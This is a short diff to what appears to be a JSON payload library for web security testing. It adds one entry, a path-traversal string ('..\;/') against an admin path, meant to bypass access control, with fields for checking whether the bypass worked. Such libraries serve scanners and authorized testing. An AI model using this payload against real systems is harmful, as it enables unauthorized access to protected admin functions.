@@ -889,5 +889,16 @@
       "expected_status_code": 200,
       "success_regex": "admin|dashboard|users|unauthorized|forbidden|403"
     }
+  },
+  {
+    "payload_id": "OWP-318016",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "url.com/admin/..\\;/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
   }
 ]
